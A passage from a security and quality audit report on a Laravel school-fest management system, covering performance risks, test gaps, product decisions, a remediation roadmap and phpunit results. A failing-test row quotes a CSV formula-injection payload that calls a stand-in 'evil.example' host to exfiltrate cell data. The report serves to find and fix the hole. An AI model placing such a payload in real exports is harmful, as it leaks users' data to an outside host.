- **`PHASE-04`** (P2) — two lifecycle-gate docblocks still claim to be "Deliberately NOT wired into any existing call site" while being live on 1 and 6 call sites respectively.

**Confirmed working — the positive baseline:**
`NAV-SEC-02` (event-scoped routes correctly deny out-of-scope access), `SA-06` (State/Super Admin nav and Results/Winners buttons resolve correctly, contingent on the same uncommitted fix `SA-01`/`SA-02` depend on), `UI-School EVT-05` (page-loader resolution, safe-report allowlist, and program-scoping are solid in the audited slice — with the explicit caveat that this is not a blanket clean bill, directly contradicted by `UI-School EVT-01` in the very same slice).

---

## 15. Performance risks

No finding in this series is based on a load test against realistic data volume (explicitly out of scope for all three audits — see the closing unverified-areas material). Every finding below is a code-pattern risk (missing index, missing chunking, missing time/memory budget) confirmed by direct source reading, not an observed production slowdown.

### 15.1 Missing database indexes

| Finding | Severity | Gap |
|---|---|---|
| `TECH-05[TechAudit]` | P2 | `fest_marks` has no `event_id`-leading index; 22 call sites filter on it, forcing sequential scans. The sibling `fest_registrations` table already has this fix. |
| `TECH-01[TechAudit]` | P1 | `fest_groups` has zero indexes at all (also a data-integrity issue — §12.1). |

### 15.2 No chunking/streaming in the report and export layer

| Finding | Severity | Gap |
|---|---|---|
| `EXP-05` | P2 | Zero use of `chunk()`/`cursor()`/`lazy()` anywhere in Fest export code; `ExcelExport` builds one full XML string in memory before streaming — the HTTP layer streams already-materialized bytes, not the underlying data generation. |
| `TECH-08[TechAudit]` | P2 | Same gap confirmed across the full ~7,600-line report/export layer (8 files); `studentsCsv()` loads every active student Sahodaya-wide with no limit, while a sibling method in the same file has an explicit `->limit(5000)` — awareness exists in one place, applied inconsistently. |
| `TECH-06[TechAudit]` | P2 | 5 report methods run a fresh query per bucket inside a loop instead of batching once; one (`certificateCountsCsv()`) runs 4 queries *per school*. A correct batch-then-group-in-memory pattern already exists elsewhere in the same file (`markEntryStatusRows()`) and just isn't reused. |

### 15.3 No memory/time budget or async fallback

| Finding | Severity | Gap |
|---|---|---|
| `EXP-06` | P2 | Only 2 of many heavy export methods bump PHP limits (both for the same GD-image-decoding reason); the existing `CsvExportDispatcher` queued-job pattern is used by 4 other controllers but zero Fest report builders. |
| `TECH-01[TestExec]` | P2 | `php artisan test`'s documented invocation OOM-crashes under the default 128MB limit, and the standard `-d memory_limit=1G` fix doesn't reach the forked child process in this Laravel install — affects every engineer/CI job running the documented command literally (§20). |

### 15.4 Non-atomic writes with a concurrency angle

| Finding | Severity | Gap |
|---|---|---|
| `TECH-03[TechAudit]` | P1 | Waitlist promotion has no lock/transaction guarding capacity — proven live to overshoot a hard participant ceiling under concurrent access. |
| `TECH-07[TechAudit]` | P2 | Batch invoice issuance is a non-atomic 2-step write with an unsynchronized number-allocation race, backstopped only by a unique-constraint hard failure. |

### 15.5 Cache-tenancy performance/isolation interaction

`TECH-02[TechAudit]` (P3) — real only if the cache-tagging bootstrapper is inactive; correctly engaged under the documented production configuration (`CACHE_STORE=redis`, DB-per-Sahodaya), but the two isolation mechanisms are coincidentally gated behind one shared flag despite being conceptually independent (§1.5).

### 15.6 What this section explicitly did not check

No query-plan analysis (`EXPLAIN`), no N+1 detection tooling run, no realistic-data-volume seed (the repository has one tenant with a handful of registrations — nowhere near "hundreds of schools, tens of thousands of students," the scale every performance finding above describes as its risk scenario), no production APM/slow-query-log data. Every performance finding in this document is a code-pattern risk, confirmed real by direct reading, whose actual production severity depends on data volume this repository cannot currently produce.

---

## 16. Test coverage gaps

Findings classified `test_gap`: code confirmed correct (either by inspection or by an executed, subsequently-deleted scratch test) but with zero permanent regression coverage protecting it — the collection of things most likely to silently break on the next refactor with nobody noticing.

### 16.1 Backend, by area

| Area | Findings |
|---|---|
| Certificates | `CERT-04` (the entire feature — generation, listing, collection — has zero test coverage) |
| Team/group validation | `DATA-08` (squad-size rejection confirmed correct via scratch test, zero permanent coverage) |
| Eligibility rules | `CS-07` (correct cross-tenant/scope rejection, zero test file references the controller at all) |
| Substitutions/clash requests | `UI-School EVT-01`'s regression test also doesn't exist for the sibling `FestClashRequestController` or `assertSchoolCanAccess()` in general |
| Fee catalog | `FEE-05[Catalog]` (`flat_school` model correct, zero tests); `KOCHI-05` (cancel/withdraw recalculation correct, tests don't assert the actual total drops); `FEE-06[Catalog]` (fee-credit payout works, zero coverage in the *permanent* suite) |
| Tenant isolation | `TIF-01` (physical DB-per-Sahodaya isolation — the actual production default — has never been exercised by any test, and a tempting runtime `config()` override doesn't actually activate the real bootstrapper) |
| Financial reconciliation | `RECON-06` (zero tests touch the classes underlying `RECON-01`/`RECON-02`; no "preview total equals export total" parity test exists anywhere in the suite) |
| Report/export security | `RPT-02` (cross-school export block works today but is untested and has 2 confirmed bypass routes) |
| Malayalam/i18n | `EXP-03` (zero literal Malayaland-script text anywhere in `tests/`, confirmed via the actual Unicode block, not a keyword grep — a real, not theoretical, gap given `EXP-01`) |

### 16.2 Frontend — no tooling exists at all, not just missing test cases

`FE-TYPECHECK-01` (P2, no TypeScript/typecheck step of any kind), `FE-UNIT-01` (P2, no Vitest/Jest, no component-level test exists), `FE-E2E-01` (P2, the 45 Playwright tests that do exist are shallow page-load smoke checks — none assert fee amounts, phase transitions, report values, or export contents; fest-specific specs silently skip rather than fail if seed data wasn't provisioned first), `FE-E2E-02` (P3, 1 spec file with 2 tests is orphaned, unreachable by any configured project).

### 16.3 Stale tests actively failing against intentional behavior changes (not app bugs, but risk while they stay red)

`RPT-03`/`TG-03` (404-vs-302, deliberate redirect UX change), `TG-01` (tenant-name uppercasing — flagged as an open *design* question, not just a stale assertion, §17.3), `TG-02` (wrong fixture model, meaning the real code path has zero coverage despite a green-looking test name), `TG-04` (asserts a superseded 4-report-type rule, now 2), `TG-05` (hardcoded array literal has two values swapped), `SEC-02[TestExec]` (asserts key-absence where the code now ships a present-but-null key), `TG-06` (stock scaffold test, missing `RefreshDatabase`), `TG-07` (two scratch test files, one committed, one not, both still counted in every suite run).

### 16.4 Genuinely unresolved — flagged, not dismissed

`TG-08` (P2 — `TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment`, explicitly flagged as possibly a real region-gating bug, not assumed benign, by both the source audit and this pass's independent re-run) and `TG-09` (P3 — an email-template HTML mismatch neither pass fully diffed). Also **`GRADE-BAND-01`**'s own root cause (the shared-state pollution mechanism behind the isolation-vs-full-suite divergence) — the *symptom* is proven live, the *source* was not bisected by any pass in this series.

### 16.5 The cross-cutting theme, stated once more because it matters more than any individual row above

Every item under `TIF-01` and this document's repeated `TENANCY_DATABASE_PER_SAHODAYA=false` callout (§1.5) is, at bottom, a test-coverage gap — just one this repository's sandbox cannot close by writing more test *code*. It requires a second real database wired into the test environment, or a genuine second live tenant, neither of which any of the three source audits nor this synthesis pass had available.

---

## 17. Product decisions requiring confirmation

Findings where the correct next step is a decision, not a fix — either because no reference material exists to verify against, or because the "right" behavior is a business-rule question this audit series cannot answer from code alone.

### 17.1 Vatakara — blocking, and the most severe item in this section

**`VTK-01`, status: `confirmation_required`** — the only finding of its kind in the entire 216-item catalog. **Zero source material of any kind exists anywhere in this repository for Vatakara** — no tenant row, no seeder, no config, no test fixture, no documentation, no image, no PDF. A case-insensitive repo-wide search for "vatakara" returns zero hits; the visually similar "vadakara" returns only 5 incidental hits (a generic UI placeholder email plus local-dev `/etc/hosts` entries, no backing tenant row). `git log` across all history: zero commits mentioning either spelling.

**This audit series was asked to verify Vatakara's fee numbers against a reference image that was never attached to the workflow.** No Vatakara fee figures appear anywhere in this document — §7's fee-comparison matrix shows every Vatakara cell as "—" rather than fabricating a number. Reporting any figure under these conditions would mean inventing data and presenting it as verified, which this document does not do.

**This blocks sign-off on Vatakara specifically** until real reference material — an image, a table, or even a plain-text transcription of membership fee type/amount, slab structure, and registration/participation figures — is supplied. Once it is, it should be traced the same way the other four named Sahodayas were: against `FestEventFeeResolver::resolveForLevel()` and related resolvers, or against a new test patterned on `FestFeeNoticeScenariosTest.php`. Nothing about Vatakara's *code path* is in question — the fee engine is generic and data-driven (§13, `FEE-01[Hardcoded]`) — only the *reference numbers* to verify it against are missing.

### 17.2 School-strength-category report (`RPT-09`)

Relabeled from the source's `missing_feature` tag to `product decision required`, per the finding's own recommendation text. No such concept exists anywhere in Fest reporting or fee code — the only "strength banding" in the codebase belongs to a wholly different module (Sahodaya membership subscription fees). `age-group-matrix` and `category-wise-students` are the closest Kalolsavam analogs (banding by age and class-category respectively, not enrollment size). **Needs product confirmation:** does this map to a real Kalolsavam requirement distinct from the membership-only band concept, or was it a miscommunication with the membership feature during requirements gathering?

### 17.3 Tenant-name uppercasing (`TG-01`)

`Tenant::getNameAttribute()` deliberately force-uppercases `name` for `type=school` tenants on every read. Three tests across `SahodayaApiTest.php`/`TenantDomainTest.php` disagree with this, asserting the pre-uppercase mixed-case string. This audit series deliberately takes no position on whether an API/JSON consumer's partner-registered school name should really be transformed on every read, or should apply only in specific print/certificate contexts. **Needs product confirmation:** is the current uppercase-everywhere behavior intentional, or should it be scoped to specific display contexts?

### 17.4 Malabar's combined fee model (`MLB-01`)

No fee model in the current catalog can express "stepped base fee by student-count slab, plus a flat per-student add-on" — Malabar's stated rule. Building it is a P1 engineering task once approved, but **needs product confirmation first**: is this genuinely Malabar's intended rule (in which case build the combined model), or was the brief's stated rule itself a miscommunication of one of the two existing mechanisms (in which case no new model is needed, just correct configuration)?

### 17.5 Sports vs. Kalolsavam unconfigured-event fee default (`FEE-02[Hardcoded]`)

An unconfigured sports event silently bills real config defaults (₹2,000 school / ₹300 student); an identically unconfigured Kalolsavam event correctly fails safe to no charge. **Needs product confirmation:** should unconfigured sports events keep silently billing, or should they fail safe like Kalolsavam? Either answer is a one-line code change — the decision, not the implementation, is what's pending.

### 17.6 Late fees and per-school discounts for Fest (`FEE-03[Catalog]`, `FEE-04[Catalog]`)

Both exist and are tested for MCQ/Training; neither exists for Fest. **Needs product confirmation:** is this an intentional scope difference between modules, or should Fest have parity? No engineering work should start here without that answer, since both would be net-new fee mechanics, not bug fixes.

### 17.7 Wayanad's 300-student sub-threshold (`WYN-02`)

Wayanad's brief describes a student-count sub-branch within the Secondary class-category tier; no existing mechanism supports a count-based sub-branch within a category tier. **Needs product confirmation:** is this a real requirement, and if so, what are the exact thresholds and amounts (the audit series only has the brief's own worked example to go on, at N=100/N=30)?

### 17.8 Late-registration/grace-period mechanism (`SCHREG-07`)

No override mechanism exists anywhere in the Fest module for registering after a window closes, including for admin-on-behalf-of-school registration. **Needs product confirmation:** is the current hard-cutoff behavior intentional (fairness-by-design), or should an audited override path be added?

### 17.9 Mark-entry time window (`Marks EVT-08`)

Mark entry is gated by a manual boolean plus a coarse status allow-list, not a scheduled open/close window like registration has. **Needs product confirmation:** does the product actually want a true scheduled mark-entry window, or is the current manual-lock model intentional?

### 17.10 State-tier feature scope (`SA-04`)

The State Finals tier has no appeals, certificates, or championship standings — a large build if wanted. **Needs product confirmation:** is this in scope for the current rollout phase, or explicitly deferred? The answer changes whether this is a P2 gap to schedule or a documented, accepted limitation.

### 17.11 Reserve-replacement and decertify workflow for State nominations (`QUAL-04`)

Both `select()`'s and `unselect()`'s own error messages promise a replacement workflow that was never built, and no decertify path exists at all once a batch is certified. **Needs product confirmation:** is this workflow still wanted (in which case it's a real, sizeable P2 build), or has the underlying maker/checker process changed since those error messages were written (in which case the messages themselves are what's stale, not the code)?

### 17.12 `override_amount` column fate (`FEE-02[Catalog]`/`FEE-04[Precedence]`/`FEE-08[Snapshot]`)

A fillable, cast, but completely dead column. **Needs an engineering/product decision** (not urgent): wire it up with a real admin UI control, or drop it in a migration. Either is fine; leaving it as-is invites a future developer to assume it works.

### 17.13 Fee-adjustment audit table (§7, "Required database changes")

Multiple findings (`FEE-01[Snapshot]`, `FEE-04[Snapshot]`, `FEE-06[Snapshot]`) point at the same missing capability: no "create a revision while preserving the original" mechanism exists anywhere in the fee domain. **Needs a design decision** on shape (new table vs. extending `FestFeeCredit`) before the P0 fixes in §9.1 are implemented, so the fix and the audit-trail design land together rather than needing rework.

---

## 18. Prioritized remediation roadmap

Organized by urgency tier, consolidating all three source audits' own remediation plans into one sequence. Finding IDs only — full detail is in §9 (use it as the reference; this section is the plan).

### Phase 0 — Immediate, ship this week (P0s and the near-one-line fixes blocking them)

1. **Fix the `FestPageActivity` namespace typo** (`EVT-01[Event setup]`/`FEE-01[Financial]`) — one line, `FestEventStatusService.php:86`. Unblocks all event cancellation, which several other fixes below depend on being reachable at all.
2. **Commit the uncommitted State-tier isolation working tree** (`SA-02`) — the code exists and passes 41/41; this is a commit-hygiene action, not new engineering.
3. **Add `StateScope` to `StateUserController`** (`SA-01`) — do this together with #2, reusing `StateScope`.
4. **Close the region-scoping gap on the 4 legacy `FestExportController` routes** (`SEC-01[Lifecycle]`/`RECON-04`) — delete the controller/routes or wrap in `region.report.scope`; add the missing lifecycle gate to `export.results` (`SEC-03[Lifecycle]`) in the same change. This is the series' single highest-severity finding.
5. **Fix bulk-assign/CSV-import roster loss** (`SCHREG-01`) and **the registration-lock edit bypass** (`SCHREG-02`) — both P0, both in the School Admin registration path.
6. **Guard `lockForRegistration()`'s two call sites** (`MCS-01`) — unblocks registration for non-regional phases before any batch-billed tenant goes live.
7. **Trigger phase resync from the phase-edit write path** (`PHASE-01`) — before any tenant relies on phase editing actually taking effect.
8. **Add the post-payment immutability guard to all four `recalculate*()` methods** (`FEE-01[Snapshot]`) and **fix the invoice sticky-status formula** (`FEE-02[Snapshot]`) — land together, same root defect class.
9. **Once #1 lands, fix batch-cancellation credit computation** (`FEE-02[Financial]`) — hard-blocked until #1 ships.

### Phase 1 — Next, before any second Sahodaya or second region goes live (P1 security, billing, and workflow-breaking bugs)

*Registration and eligibility:* `CS-01` (pair/trio squad enforcement), `CS-02` (dead prior-qualification rule), `CS-03` (eligibility rules dead on partition children), `SCHREG-03` (substitution skips eligibility), `DATA-01` (2nd team/pair/trio registration).

*Event operations:* `Event-ops EVT-01` (cross-region clash/appeal/attendance writes), `Event-ops EVT-02` (unrelated-event attendance falsification), `Event-ops EVT-03` (empty Appeals queue on hubs), `Event-ops EVT-04` (teacher double-booking), `TECH-03[TechAudit]` (waitlist capacity race), `TECH-01[TechAudit]` (chest-number/item-registration schema constraints).

*Marks and results:* `Marks EVT-01` (zero-marks publish by default), `Marks EVT-02` (unbounded judge subtotals), `Marks EVT-04` (disqualification permanently blocks publish) — fix all three together, since #1 and #3 interact.

*Qualification, certificates, navigation:* `QUAL-01` (unverified manual State nominations), `CERT-01` (certificate collection ignores entity type), `CERT-02`/`SEC-04[Lifecycle]` (stale certs/qualifications survive disqualify/unpublish), `CERT-03` (public verify likely broken per-Sahodaya, closable only with real second-DB testing), `UI-School EVT-01` (substitution requests missing partition-scope guard), `NAV-SEC-01` (read-side permission gap across 126 controllers — start with the 4-5 highest-risk pages named in §9.2), `PUB-01` (participant lookup pre-publish leak), `API-01` (API event-list scope bypass).

*Phase and fee mechanics:* `PHASE-02` (non-phase-aware item windows), `PHASE-03`/`SEC-05[Lifecycle]` (phase_mode_enabled has no public-visibility awareness — fix together with `SEC-06[Lifecycle]`), `FEE-03[Financial]` (phase-cancellation no cascade), `KOCHI-02` (group-item overbilling), `MLB-01` (once §17.4's product decision lands), `FEE-03[Precedence]` (cap/floor only protects 1 of 4 paths), `FEE-05[Precedence]` (invoice lines only 2 of 9 models), `FEE-07[Precedence]` (receipt view not frozen), `FEE-01[Catalog]` (appeal fee has no audit trail).

*Reports, security, and technical debt:* `RECON-01` (paid-amount under-reporting), `RECON-02` (rollup double-counting), `SEC-01[SecAudit]`/`EXP-02`/`SEC-01[TestExec]` (CSV/Excel formula injection — one fix, apply everywhere), `SEC-02[Lifecycle]` (athletic-records pre-publish leak), `EXP-01` (Malayalam PDF rendering), `BUG-03` (board-result awards SQL error — out of module but flagged).

### Phase 2 — Soon, within the next planning cycle (P2 incomplete features, reports, lifecycle consistency)

Event setup (`EVT-02[Event setup]`, `EVT-03[Event setup]`, `EVT-06[Event setup]`) · Competition setup (`CS-04`, `CS-05`) · School registration (`SCHREG-04`) · Marks (`Marks EVT-03`, `Marks EVT-05`) · Qualification (`QUAL-02`, `QUAL-03`, `QUAL-04` pending §17.11) · Certificates (`CERT-04`, `CERT-06`) · Data integrity (`DATA-02`, `TECH-04[TechAudit]`, `TECH-07[TechAudit]`) · UI (`UI-School EVT-02`, `UI-School EVT-03`) · State tier (`SA-03`, `SA-04` pending §17.10) · Public (`PUB-02`, `PUB-03`) · Phase (`PHASE-04`, `PHASE-05`) · Fee catalog (`FEE-03[Catalog]`/`FEE-04[Catalog]` pending §17.6, `FEE-05[Catalog]`, `WYN-02` pending §17.7, `KOCHI-07`, `MLB-02`, `MCS-02`, `TIF-01`, `FEE-01[Precedence]`, `FEE-08[Precedence]`, `FEE-02[Hardcoded]` pending §17.5) · Reports (`RPT-01`, `RPT-02`, `RPT-03`, `RPT-04`, `RECON-03`, `RECON-06`) · Security hygiene (`SEC-02[SecAudit]`) · Export quality (`EXP-03`, `EXP-04`, `EXP-05`, `EXP-06`) · Technical (`TECH-05[TechAudit]`, `TECH-06[TechAudit]`) · Test infrastructure (`SUM-01`, `TECH-01[TestExec]`, `TG-08`, `FE-TYPECHECK-01`, `FE-UNIT-01`, `FE-E2E-01`) · New (`GRADE-BAND-01`, before committing the in-progress grade-banding feature).

### Phase 3 — Backlog (P3 usability, maintainability, dead-code hygiene)

Design gaps needing a product decision first (§17): `SCHREG-06`, `SCHREG-07`, `Marks EVT-08`. Dead code safe to delete now: `app/_to_delete/**` (`SEC-05[SecAudit]`/`TECH-01[Lifecycle]`), the duplicate `Pages/StateAdmin/**` tree (`SA-05`), `fest.discipline` (`NAV-03`/`Event-ops EVT-05`, pending a decision on whether to wire it instead). Minor confirmed bugs: `SCHREG-05`, `QUAL-05`, `QUAL-07`, `UI-School EVT-04`, `NAV-04`, `NAV-05`, `KOCHI-03`, `EXP-07`, `EXP-08`, `EXP-09`, `TECH-02[TechAudit]`, `TECH-09[TechAudit]`, `SEC-03[SecAudit]`, `SEC-04[SecAudit]`. Test-only fixes: `RPT-05` through `RPT-09` (pending §17.2 for `RPT-09`), `TG-01` (pending §17.3) through `TG-09`, `SEC-02[TestExec]`, `FE-E2E-02`, `MCS-06`, `DATA-08`. Stale documentation: `NAV-06`.

---

## 19. Recommended implementation order

Section 18 groups by urgency; this section sequences by **dependency** — what genuinely cannot start, or cannot be verified, until something else lands first. Follow this order within each phase of §18, not instead of it.

1. **`EVT-01[Event setup]`/`FEE-01[Financial]` (the namespace typo) must land before `FEE-02[Financial]`, `EVT-06[Event setup]`, and any cancellation-related test writing.** Nothing downstream of cancellation is even reachable to test until this one-line fix ships — it is the single most-blocking item in the entire catalog relative to its own fix size.
2. **`SA-02` (commit the working tree) must land before `SA-01`'s fix is meaningful in production**, and before `SA-06`'s "not a gap" verdict can be trusted for a deployed instance rather than just the working tree. Land both together.
3. **`FEE-01[Snapshot]` and `FEE-02[Snapshot]` should land together** — same root defect class (post-payment mutation with no snapshot) hitting the fee row and the invoice row respectively; fixing one without the other leaves a visible inconsistency between the two views of the same fee.
4. **`FEE-03[Precedence]` (cap/floor) should be fixed as part of the same effort as `FEE-01[Snapshot]`**, since both touch all four `recalculate*()` methods — one pass through those methods can fix both.
5. **`CS-01` and `DATA-01`'s pair/trio half share a root cause** (the hardcoded `['group','team']` exclusion of pair/trio across `FestRegistrationCreateService`/`FestParticipationLimitService`/`FestRegistrationImportService`) — fix in one pass, not two separate PRs that could reintroduce drift between them.
6. **`Marks EVT-01` and `Marks EVT-04` interact**: defaulting `require_all_marks_before_publish` to `true` (part of `EVT-01`'s fix) makes `EVT-04`'s disqualification-blocks-publish bug *more* likely to trigger, not less. Fix `EVT-04` first or in the same change as `EVT-01`, never `EVT-01` alone.
7. **`SEC-01[Lifecycle]` and `RECON-04` are one fix**, not two — do not schedule or estimate them as separate work items (§1.3). `SEC-03[Lifecycle]` (lifecycle gate on the same legacy controller) belongs in the same change.
8. **`PHASE-03`/`SEC-05[Lifecycle]` and `SEC-06[Lifecycle]` touch the same phase-visibility code area** — sequence them as one effort even though `SEC-06[Lifecycle]` is kept as a separate catalog entry.
9. **§17's product decisions block their dependent engineering work, not the other way around** — do not schedule engineering time for `MLB-01`, `FEE-03[Catalog]`/`FEE-04[Catalog]`, `WYN-02`, `FEE-02[Hardcoded]`, `SCHREG-07`, `Marks EVT-08`, `SA-04`, or `QUAL-04` until the corresponding §17 decision is made — the roadmap in §18 already reflects this with "pending §17.X" markers.
10. **`TIF-01`'s real fix (a second physical database in the test environment) should be scheduled independently of any single finding**, since it is what would let `CERT-03`, `SA-03`, and `TECH-02[TechAudit]` move from `likely`/defense-in-depth to fully confirmed or fully closed — treat it as shared testing infrastructure investment, not a per-finding fix.
11. **`GRADE-BAND-01` blocks its own feature's commit**, not any of this document's other findings — but should be resolved before the in-progress percentage-banding work merges, independent of this roadmap's other phasing.
12. **Vatakara (§17.1) blocks nothing else in this document** — it is an isolated data-gathering task, not a code dependency, and should proceed in parallel with any engineering phase above.

---

## 20. Exact test commands and final results

**Transcribed faithfully from Audit 3's own test-execution section (§7 there), which itself independently re-ran every command fresh in that audit's session rather than only transcribing an earlier pass — numbers below are reported exactly as that audit recorded them, unsoftened, including where its own fresh run disagreed with the data it started from.** This synthesis pass did not re-run the full battery again (doing so would produce a third, slightly different set of numbers from ongoing working-tree changes and add no verification value beyond what Audit 3 already did rigorously) — but did independently spot-check the sandbox environment (§2.1) and one representative test (`FestFeeNoticeScenariosTest`, below) to confirm the sandbox still behaves as described.

### 20.1 The documented standard invocation crashes with an out-of-memory fatal error

```
php artisan test tests/Unit/Services/Events tests/Feature/Events tests/Feature/SahodayaAdmin tests/Feature/State tests/Feature/Public tests/Unit/Support tests/Unit/Middleware tests/Feature/Api/SahodayaApiTest.php tests/Feature/SahodayaAttendancePresentationTest.php tests/Feature/SahodayaCredentialsHubTest.php tests/Feature/SahodayaPublicContentTest.php tests/Feature/SahodayaPublicSiteTest.php tests/Feature/SahodayaSchoolCredentialsTest.php tests/Feature/SahodayaWebsiteSiteScopeTest.php tests/Feature/SahodayaWebsiteV2Test.php tests/Feature/SuperadminSahodayaAdminAccessTest.php tests/Feature/Console/ListPendingFestRegistrationsTest.php
```

Crashes deterministically with `PHP Fatal error: Allowed memory size of 134217728 bytes exhausted` (128MB, PHP's compiled-in default) inside Symfony's `HtmlErrorRenderer`. Prefixing `php -d memory_limit=1G` does **not** fix it — `artisan test` forks a child PHPUnit process that does not inherit the parent CLI's `-d` override in this Laravel install.

Audit 3's own fresh re-run reproduced this exactly: identical crash on `Tests\Feature\SahodayaAdmin\BoardResultCertificationSyncTest::test_verify_is_blocked_until_school_certification_is_complete`, with 146 tests already run before the crash (144 passed, 2 failed, 426 assertions, 8708ms) — the 2 failures visible at that point were byte-identical in wording to `RPT-03`/`TG-03` (404-vs-302) and `SEC-01[TestExec]` (formula-injection payload). A second attempt with `php -d memory_limit=1G artisan test ...` prefixed reproduced the exact same crash, exact same byte figure. Running `vendor/bin/phpunit` **directly** with `-d memory_limit=1G` does not crash (§20.2).

### 20.2 Focused suite — `vendor/bin/phpunit -d memory_limit=1G`, same 17 paths as §20.1

```
php -d memory_limit=1G vendor/bin/phpunit tests/Unit/Services/Events tests/Feature/Events tests/Feature/SahodayaAdmin tests/Feature/State tests/Feature/Public tests/Unit/Support tests/Unit/Middleware tests/Feature/Api/SahodayaApiTest.php tests/Feature/SahodayaAttendancePresentationTest.php tests/Feature/SahodayaCredentialsHubTest.php tests/Feature/SahodayaPublicContentTest.php tests/Feature/SahodayaPublicSiteTest.php tests/Feature/SahodayaSchoolCredentialsTest.php tests/Feature/SahodayaWebsiteSiteScopeTest.php tests/Feature/SahodayaWebsiteV2Test.php tests/Feature/SuperadminSahodayaAdminAccessTest.php tests/Feature/Console/ListPendingFestRegistrationsTest.php
```

**Result:** `Tests: 357, Assertions: 2267, Failures: 7.` — exact match to Audit 3's own prior data for this exact command (tests=357, passed=350, assertions=2267, failed=7). Duration 19.9s this run vs. 18.47s previously (normal run-to-run variance).

All 7 failures, reconciled against catalog finding IDs:

| # | Test | Exact failure message | Finding |
|---|---|---|---|
| 1 | `FestSchoolReportBoundaryTest::test_program_route_rejects_an_event_of_another_type` | `Failed asserting that 302 is identical to 404.` | `RPT-03`/`TG-03` |
| 2 | `SahodayaApiTest::test_sahodaya_admin_can_view_school_details` | `-'Govt HS' / +'GOVT HS'` | `TG-01` |
| 3 | `SahodayaApiTest::test_schools_can_be_filtered_by_payment_status` | `-'Unpaid School' / +'UNPAID SCHOOL'` | `TG-01` |
| 4 | `SahodayaAttendancePresentationTest::test_sixteen_students_fit_on_one_dompdf_page_section` | `Failed asserting that 2 is identical to 1.` | `BUG-01` (real bug — attendance-sheet PDF header renders twice) |
| 5 | `SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite` | Expected `href="/m/innovation-expo#about-sahodaya"` not found in a 23,843-char rendered page | Not named by any source finding — genuinely open, §20.6 |
| 6 | `SahodayaWebsiteV2Test::test_homepage_mode_follows_event_lifecycle_without_a_live_override` | `-'registration_open' / +'evergreen'` | `TG-02` |
| 7 | `ScratchFormulaInjectionAuditTest::test_transaction_ref_formula_payload_is_not_escaped_in_csv_export` | Raw CSV `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,""Click for receipt"")"` present, unneutralized | `SEC-01[TestExec]`/`EXP-02`/`TG-07` (real vulnerability) |

### 20.3 Full suite — `vendor/bin/phpunit`, no path arguments

**Audit 3's own starting data point:** `tests=809 passed=792 assertions=4063 duration_ms=45216 failed=16`.

**Audit 3's own fresh re-run, same command:**
```
time php -d memory_limit=1G vendor/bin/phpunit
```
```json
{"tool":"phpunit","result":"failed","tests":813,"passed":792,"assertions":4065,"duration_ms":45209,"failed":18}
```
(41.16s user, 3.27s system, 97% CPU, 45.469s total wall clock.)

**`passed=792` is identical between the two runs.** `tests`, `assertions`, and `failed` are each slightly higher in the fresh run (+4 tests, +2 assertions, +2 failures) — not noise: the delta is exactly explained by `GRADE-BAND-01` (§9.3), 2 newly-added tests that fail under full-suite ordering plus 2 more from the same feature file, added to the working tree between the two runs. **No previously-passing test newly broke.**

The full 18-failure list from Audit 3's fresh run (16 reconcile exactly against named findings; 2 are new, `GRADE-BAND-01`):

| # | Test | Finding | Status |
|---|---|---|---|
| 1 | `FestGradePointServiceGenericConfigTest::test_raw_score_bands_resolve_highest_match_regardless_of_storage_order` | `GRADE-BAND-01` | New — see §9.3 |
| 2 | `FestGradePointServiceGenericConfigTest::test_item_specific_band_takes_priority_over_event_wide` | `GRADE-BAND-01` | New — see §9.3 |
| 3 | `TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment` | `TG-08` | Unresolved |
| 4 | `SahodayaApiTest::test_sahodaya_admin_can_view_school_details` | `TG-01` | Identified |
| 5 | `SahodayaApiTest::test_schools_can_be_filtered_by_payment_status` | `TG-01` | Identified |
| 6 | `EmailTemplatesTest::test_verify_email_notification_renders_html_body` | `TG-09` | Unresolved |
| 7 | `FestSchoolReportBoundaryTest::test_program_route_rejects_an_event_of_another_type` | `RPT-03`/`TG-03` | Identified |
| 8 | `ScratchFormulaInjectionAuditTest::test_transaction_ref_formula_payload_is_not_escaped_in_csv_export` | `SEC-01[TestExec]`/`EXP-02`/`TG-07` | Identified — real vulnerability |
| 9 | `ExampleTest::test_the_application_returns_a_successful_response` | `TG-06` | Identified — `Expected [200] but received 500 ... no such table: tenants`; no `RefreshDatabase` trait |
| 10 | `PlaintextPasswordRevealTest::test_superadmin_tenants_show_does_not_ship_plaintext_password_but_reveal_endpoint_returns_it` | `SEC-02[TestExec]` | Identified — shipped value is `null`, key-shape only |
| 11 | `SahodayaAttendancePresentationTest::test_sixteen_students_fit_on_one_dompdf_page_section` | `BUG-01` | Identified — real bug |
| 12 | `SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite` | — | Genuinely open, §20.6 |
| 13 | `SahodayaWebsiteV2Test::test_homepage_mode_follows_event_lifecycle_without_a_live_override` | `TG-02` | Identified |
| 14 | `BoardResultCertificationControllerTest::test_full_school_certification_flow_via_http` | `TG-04` | Identified — `Failed asserting that actual size 2 matches expected size 4.` |
| 15 | `BoardResultCertificationControllerTest::test_school_admin_cannot_sign_only_principal_or_vice_principal_can` | `TG-03` (2nd case) | Symptom-only match confirmed, root cause not independently verified |
| 16 | `BoardResultCertificationServiceTest::test_request_leadership_review_creates_package_and_pending_reports_for_class_x` | `TG-04` | Identified |
| 17 | `BoardResultCertificationServiceTest::test_class_xii_report_definitions_are_generated_per_configured_stream` | `TG-05` | Identified — expected `[9,8]`, actual `[8,9]` |
| 18 | `TenantDomainTest::test_custom_domain_public_site_is_reachable` | `TG-01` | Identified — same uppercase accessor; this test's HTML is also where `BUG-02` was originally spotted |

### 20.4 Application log growth during test execution

Audit 3's own measurement: baseline 6,349 lines before that session's runs; 6,573 lines after (+224, across the OOM-crash attempt, the focused run, and the full run). Of those, exactly 3 ERROR-level, 0 CRITICAL/EMERGENCY: 2× `testing.ERROR: Board result publish pipeline failed after status update: SQLSTATE[HY000]: General error: 1 no such column: subject_id` (byte-identical to `BUG-03`, confirmed fresh) and 1× `testing.ERROR: SQLSTATE[HY000]: General error: 1 no such table: tenants` (from `TG-06`'s known-broken scaffold test).

### 20.5 Frontend: build, typecheck, unit tests, e2e

| Check | Status | Finding |
|---|---|---|
